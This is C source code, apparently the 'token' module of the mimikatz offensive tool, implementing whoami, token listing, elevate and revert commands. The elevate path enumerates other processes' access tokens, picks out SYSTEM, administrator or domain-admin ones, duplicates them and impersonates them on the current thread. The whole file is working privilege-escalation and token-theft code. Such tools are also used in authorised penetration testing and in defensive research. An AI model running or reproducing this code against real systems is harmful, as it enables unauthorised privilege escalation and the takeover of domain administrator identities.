/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_token.h"

const KUHL_M_C kuhl_m_c_token[] = {
	{kuhl_m_token_whoami,	L"whoami",	L"Display current identity"},
	{kuhl_m_token_list,		L"list",	L"List all tokens of the system"},
	{kuhl_m_token_elevate,	L"elevate",	L"Impersonate a token"},

	{kuhl_m_token_revert,	L"revert",	L"Revert to proces token"},
};
const KUHL_M kuhl_m_token = {
	L"token",	L"Token manipulation module", NULL,
	ARRAYSIZE(kuhl_m_c_token), kuhl_m_c_token, NULL, NULL
};

NTSTATUS kuhl_m_token_whoami(int argc, wchar_t * argv[])
{
	HANDLE hToken;
	kprintf(L" * Process Token : ");
	if(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		kuhl_m_token_displayAccount(hToken);
		CloseHandle(hToken);
	}
	else PRINT_ERROR_AUTO(L"OpenProcessToken");

	kprintf(L" * Thread Token  : ");
	if(OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken))
	{
		kuhl_m_token_displayAccount(hToken);
		CloseHandle(hToken);
	}
	else if(GetLastError() == ERROR_NO_TOKEN)
		kprintf(L"no token\n");
	else PRINT_ERROR_AUTO(L"OpenThreadToken");

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_token_list(int argc, wchar_t * argv[])
{
	kuhl_m_token_list_or_elevate(argc, argv, FALSE);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_token_elevate(int argc, wchar_t * argv[])
{
	kuhl_m_token_list_or_elevate(argc, argv, TRUE);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_token_list_or_elevate(int argc, wchar_t * argv[], BOOL elevate)
{
	KUHL_M_TOKEN_ELEVATE_DATA pData = {NULL, NULL, 0, elevate};
	WELL_KNOWN_SID_TYPE type = WinNullSid;
	PWSTR name, domain;
	PCWSTR strTokenId;
	PPOLICY_DNS_DOMAIN_INFO pDomainInfo = NULL;

	kull_m_string_args_byName(argc, argv, L"user", &pData.pUsername, NULL);

	if(kull_m_string_args_byName(argc, argv, L"id", &strTokenId, NULL))
	{
		pData.tokenId = wcstoul(strTokenId, NULL, 0);
	}
	else if(kull_m_string_args_byName(argc, argv, L"domainadmin", NULL, NULL))
	{
		type = WinAccountDomainAdminsSid;
		if(!kull_m_net_getCurrentDomainInfo(&pDomainInfo))
			PRINT_ERROR_AUTO(L"kull_m_local_domain_user_getCurrentDomainSID");
	}
	else if(kull_m_string_args_byName(argc, argv, L"admin", NULL, NULL))
		type = WinBuiltinAdministratorsSid;
	else if((elevate && !pData.pUsername) || kull_m_string_args_byName(argc, argv, L"system", NULL, NULL))
	{
		type = WinLocalSystemSid;
		if(pData.pUsername)
		{
			PRINT_ERROR(L"No username available when SYSTEM\n");
			pData.pUsername = NULL;
		}
	}

	if(!elevate || pData.tokenId || type || pData.pUsername)
	{
		kprintf(L"Token Id  : %u\nUser name : %s\nSID name  : ", pData.tokenId, pData.pUsername ? pData.pUsername : L"");
		if(type)
		{
			if(kull_m_net_CreateWellKnownSid(type, pDomainInfo ? pDomainInfo->Sid : NULL, &pData.pSid))
			{
				if(kull_m_token_getNameDomainFromSID(pData.pSid, &name, &domain, NULL))
				{
					kprintf(L"%s\\%s\n", domain, name);
					LocalFree(name);
					LocalFree(domain);
				} else PRINT_ERROR_AUTO(L"kull_m_token_getNameDomainFromSID");
			}
			else PRINT_ERROR_AUTO(L"kull_m_local_domain_user_CreateWellKnownSid");
		}
		else kprintf(L"\n");
		kprintf(L"\n");
		
		if(!elevate || pData.tokenId || pData.pSid || pData.pUsername)
			kull_m_token_getTokens(kuhl_m_token_list_or_elevate_callback, &pData);
		
		if(pData.pSid)
			LocalFree(pData.pSid);
		
		if(pDomainInfo)
			LsaFreeMemory(pDomainInfo);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_token_revert(int argc, wchar_t * argv[])
{
	if(SetThreadToken(NULL, NULL))
		kuhl_m_token_whoami(0, NULL);
	else
		PRINT_ERROR_AUTO(L"SetThreadToken");
	return STATUS_SUCCESS;
}

const wchar_t * KUHL_M_TOKEN_IMPERSONATION_LEVEL[] = {L"Anonymous", L"Identification", L"Impersonation", L"Delegation",};
const wchar_t * KUHL_M_TOKEN_TYPE[] = {L"Unknown", L"Primary", L"Impersonation",};
void kuhl_m_token_displayAccount(HANDLE hToken)
{
	ULONG szNeeded;
	TOKEN_STATISTICS tokenStats;
	PWSTR name, domainName, sid;
	
	if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(TOKEN_STATISTICS), &szNeeded))
	{
		kprintf(L"%-10u\t", tokenStats.TokenId.LowPart);
		if(kull_m_token_getNameDomainFromToken(hToken, &name, &domainName, &sid, NULL))
		{
			kprintf(L"%s\\%s\t%s", domainName, name, sid);
			LocalFree(name);
			LocalFree(domainName);
			LocalFree(sid);
		}
		kprintf(L"\t(%02ug,%02up)\t%s", tokenStats.GroupCount, tokenStats.PrivilegeCount, KUHL_M_TOKEN_TYPE[tokenStats.TokenType]);
		if(tokenStats.TokenType == TokenImpersonation)
			kprintf(L" (%s)", KUHL_M_TOKEN_IMPERSONATION_LEVEL[tokenStats.ImpersonationLevel]);
		kprintf(L"\n");
	}
}

BOOL CALLBACK kuhl_m_token_list_or_elevate_callback(HANDLE hToken, DWORD ptid, PVOID pvArg)
{
	HANDLE hNewToken;
	TOKEN_STATISTICS tokenStats;
	DWORD szNeeded;
	BOOL isUserOK = TRUE;
	PKUHL_M_TOKEN_ELEVATE_DATA pData = (PKUHL_M_TOKEN_ELEVATE_DATA) pvArg;
	PWSTR name, domainName;

	if(ptid != GetCurrentProcessId())
	{
		if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(TOKEN_STATISTICS), &szNeeded))
		{
			if(pData->pUsername)
			{
				if(kull_m_token_getNameDomainFromToken(hToken, &name, &domainName, NULL, NULL))
				{
					isUserOK = (_wcsicmp(name, pData->pUsername) == 0);
					LocalFree(name);
					LocalFree(domainName);
				}
			} else if(pData->tokenId)
				isUserOK = (pData->tokenId == tokenStats.TokenId.LowPart);

			if(isUserOK && DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, (tokenStats.TokenType == TokenPrimary) ? SecurityDelegation : tokenStats.ImpersonationLevel, TokenImpersonation, &hNewToken))
			{
				if(pData->pSid)
				{
					isUserOK = FALSE;
					if(!CheckTokenMembership(hNewToken, pData->pSid, &isUserOK))
						PRINT_ERROR_AUTO(L"CheckTokenMembership");
				}
				if(isUserOK)
				{
					kprintf(L"%u\t", ptid);
					kuhl_m_token_displayAccount(hToken);

					if(pData->elevateIt)
					{
						if(SetThreadToken(NULL, hNewToken))
						{
							kprintf(L" -> Impersonated !\n");
							kuhl_m_token_whoami(0, NULL);
							isUserOK = FALSE;
						}
						else PRINT_ERROR_AUTO(L"SetThreadToken");
					}
				}
				else isUserOK = TRUE;
				CloseHandle(hNewToken);
			}
			else isUserOK = TRUE;
		}
	}
	return isUserOK;
}